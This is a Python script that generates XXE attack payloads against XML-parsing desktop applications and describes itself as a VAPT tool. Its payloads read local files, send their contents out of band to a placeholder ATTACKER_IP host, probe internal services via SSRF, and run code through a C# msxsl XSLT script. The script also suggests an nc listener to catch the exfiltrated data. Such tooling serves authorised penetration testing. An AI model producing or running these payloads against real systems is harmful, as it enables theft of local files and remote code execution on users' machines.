"""
XXE (XML External Entity) Payload Generator for Desktop Apps

Attack Vector:
    Desktop applications that parse XML (config files, project files,
    SVG images, DOCX/XLSX/PPTX, SOAP, RSS) may be vulnerable to XXE.
    This allows reading local files, SSRF, or in some cases RCE.

Common XML-based import formats:
    .xml, .svg, .xsl, .xslt, .config, .csproj, .vcxproj,
    .docx (unzipped), .xlsx (unzipped), .pptx (unzipped),
    .dxf (some variants), .rss, .atom, .soap

Usage:
    python -I xml_xxe.py --output payloads/ --type all
    python -I xml_xxe.py --output test.xml --type file-read --target "C:/Windows/win.ini"
    python -I xml_xxe.py --output test.svg --type svg
"""

import argparse
import os


PAYLOADS = {
    # --- File read payloads ---
    "file-read-basic": {
        "desc": "Basic XXE — read a local file",
        "ext": ".xml",
        "content": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>
  <data>&xxe;</data>
</root>
""",
    },

    "file-read-param": {
        "desc": "Parameter entity XXE (bypasses some filters)",
        "ext": ".xml",
        "content": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8080/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>
""",
    },

    "file-read-cdata": {
        "desc": "CDATA wrapper for reading files with special chars",
        "ext": ".xml",
        "content": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/xxe.dtd">
  %dtd;
]>
<root>&all;</root>
""",
    },

    # --- SVG XXE ---
    "svg": {
        "desc": "SVG image with XXE (many apps render SVG)",
        "ext": ".svg",
        "content": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20" font-size="12">&xxe;</text>
</svg>
""",
    },

    # --- SSRF via XXE ---
    "ssrf": {
        "desc": "SSRF via XXE — probe internal services",
        "ext": ".xml",
        "content": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root>
  <data>&xxe;</data>
</root>
""",
    },

    # --- OOB (Out-of-Band) XXE ---
    "oob": {
        "desc": "Out-of-band XXE — exfiltrate via HTTP callback",
        "ext": ".xml",
        "content": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/oob.dtd">
  %dtd;
]>
<root>test</root>

<!-- Host this as oob.dtd on your server:
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER_IP:8080/?data=%file;'>">
%all;
-->
""",
    },

    # --- .NET specific ---
    "dotnet-config": {
        "desc": ".NET config XXE (app.config / web.config style)",
        "ext": ".config",
        "content": """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE configuration [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<configuration>
  <appSettings>
    <add key="Setting1" value="&xxe;" />
  </appSettings>
</configuration>
""",
    },

    # --- XSLT injection ---
    "xslt": {
        "desc": "XSLT code execution (if app processes XSLT)",
        "ext": ".xslt",
        "content": """<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:cs="urn:cs">

  <msxsl:script language="C#" implements-prefix="cs">
    <![CDATA[
      public string exec() {
        System.Diagnostics.Process.Start("calc.exe");
        return "executed";
      }
    ]]>
  </msxsl:script>

  <xsl:template match="/">
    <result><xsl:value-of select="cs:exec()"/></result>
  </xsl:template>
</xsl:stylesheet>
""",
    },
}


def main():
    parser = argparse.ArgumentParser(description="XXE/XML payload generator for VAPT")
    parser.add_argument("--output", "-o", default=".", help="Output directory or file")
    parser.add_argument("--type", choices=list(PAYLOADS.keys()) + ["all"], default="all")
    parser.add_argument("--target", default="C:/Windows/win.ini",
                        help="Target file to read (default: win.ini)")
    parser.add_argument("--attacker-ip", default="ATTACKER_IP",
                        help="Your listener IP for OOB payloads")
    args = parser.parse_args()

    types_to_gen = list(PAYLOADS.keys()) if args.type == "all" else [args.type]

    if os.path.isdir(args.output) or args.type == "all":
        os.makedirs(args.output, exist_ok=True)

    print(f"[*] XXE/XML Payload Generator")
    print(f"[*] Target file: {args.target}\n")

    for name in types_to_gen:
        payload = PAYLOADS[name]
        content = payload["content"]
        content = content.replace("C:/Windows/win.ini", args.target)
        content = content.replace("ATTACKER_IP", args.attacker_ip)

        if os.path.isdir(args.output) or args.type == "all":
            filepath = os.path.join(args.output, f"xxe_{name}{payload['ext']}")
        else:
            filepath = args.output

        with open(filepath, "w") as f:
            f.write(content)
        print(f"[+] {filepath} — {payload['desc']}")

    print(f"\n[*] For OOB payloads, start a listener:")
    print(f"    python -m http.server 8080")
    print(f"    # or: nc -lvnp 8080")


if __name__ == "__main__":
    main()
